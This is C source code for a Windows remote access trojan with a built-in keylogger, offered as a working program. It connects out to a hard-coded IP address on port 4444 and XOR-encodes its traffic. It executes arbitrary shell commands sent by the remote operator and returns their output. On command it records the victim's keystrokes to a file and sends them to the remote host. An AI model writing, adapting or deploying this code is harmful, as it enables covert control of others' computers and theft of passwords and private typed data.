#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")

#define SERVER_IP "47.156.134.231" // Replace with your public IP
#define SERVER_PORT 4444
#define BUFFER_SIZE 4096
#define XOR_KEY 0xAA // XOR encryption key

int keylogging = 0; // Flag to enable/disable keylogging

// XOR encryption/decryption
void xor_encrypt_decrypt(char *data, int len, char key) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// Keylogger function (runs in a separate thread)
DWORD WINAPI keylogger_thread(LPVOID param) {
    FILE *log_file = fopen("keystrokes.log", "a+");
    if (!log_file) return 1;

    while (keylogging) {
        for (char key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                if ((key >= 39 && key <= 64) || (key >= 65 && key <= 90) || (key >= 48 && key <= 57)) {
                    fputc(key, log_file);
                } else if (key == VK_SPACE) {
                    fputc(' ', log_file);
                } else if (key == VK_RETURN) {
                    fputc('\n', log_file);
                }
                fflush(log_file);
            }
        }
        Sleep(10);
    }

    fclose(log_file);
    return 0;
}

// Handle commands from the server
void handle_command(char *command, SOCKET sock) {
    char response[BUFFER_SIZE] = {0};

    if (strncmp(command, "exec ", 5) == 0) {
        FILE *pipe = _popen(command + 5, "r");
        if (!pipe) {
            snprintf(response, BUFFER_SIZE, "Failed to execute command.");
            send(sock, response, strlen(response), 0);
            return;
        }
        while (fgets(response, BUFFER_SIZE - 1, pipe)) {
            xor_encrypt_decrypt(response, strlen(response), XOR_KEY);
            send(sock, response, strlen(response), 0);
        }
        _pclose(pipe);
    } else if (strcmp(command, "start_keylogger") == 0) {
        if (!keylogging) {
            keylogging = 1;
            CreateThread(NULL, 0, keylogger_thread, NULL, 0, NULL);
            snprintf(response, BUFFER_SIZE, "Keylogger started.");
        } else {
            snprintf(response, BUFFER_SIZE, "Keylogger is already running.");
        }
        xor_encrypt_decrypt(response, strlen(response), XOR_KEY);
        send(sock, response, strlen(response), 0);
    } else if (strcmp(command, "stop_keylogger") == 0) {
        if (keylogging) {
            keylogging = 0;
            snprintf(response, BUFFER_SIZE, "Keylogger stopped.");
        } else {
            snprintf(response, BUFFER_SIZE, "Keylogger is not running.");
        }
        xor_encrypt_decrypt(response, strlen(response), XOR_KEY);
        send(sock, response, strlen(response), 0);
    } else if (strcmp(command, "get_keystrokes") == 0) {
        FILE *log_file = fopen("keystrokes.log", "r");
        if (log_file) {
            char temp_buffer[BUFFER_SIZE] = {0};
            while (fgets(temp_buffer, sizeof(temp_buffer), log_file)) {
                xor_encrypt_decrypt(temp_buffer, strlen(temp_buffer), XOR_KEY);
                send(sock, temp_buffer, strlen(temp_buffer), 0);
            }
            fclose(log_file);
        } else {
            snprintf(response, BUFFER_SIZE, "No keystrokes logged.");
            xor_encrypt_decrypt(response, strlen(response), XOR_KEY);
            send(sock, response, strlen(response), 0);
        }
    } else {
        snprintf(response, BUFFER_SIZE, "Unknown command.");
        xor_encrypt_decrypt(response, strlen(response), XOR_KEY);
        send(sock, response, strlen(response), 0);
    }
}

int main() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Failed to initialize Winsock.\n");
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed.\n");
        WSACleanup();
        return 1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("Connection to server failed.\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    printf("Connected to server.\n");

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received <= 0) {
            printf("Server disconnected or error receiving data.\n");
            break;
        }

        buffer[bytes_received] = '\0'; // Null-terminate
        xor_encrypt_decrypt(buffer, bytes_received, XOR_KEY);
        printf("Command received: %s\n", buffer);

        handle_command(buffer, sock);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
